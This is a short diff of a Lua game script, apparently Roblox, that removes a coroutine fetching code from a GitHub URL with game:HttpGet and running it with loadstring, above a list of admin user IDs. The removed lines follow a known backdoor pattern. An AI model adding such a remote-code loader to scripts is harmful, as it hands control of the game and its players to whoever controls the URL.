@@ -1,8 +1,3 @@
-local Thread1 = coroutine.create(function()
-    loadstring(game:HttpGet('https://raw.githubusercontent.com/ForgotQuiz/ImNotOk/main/rank', true))()
-end)
-coroutine.resume(Thread1)
-
 local admins = {
     528650746,
     3106920778,
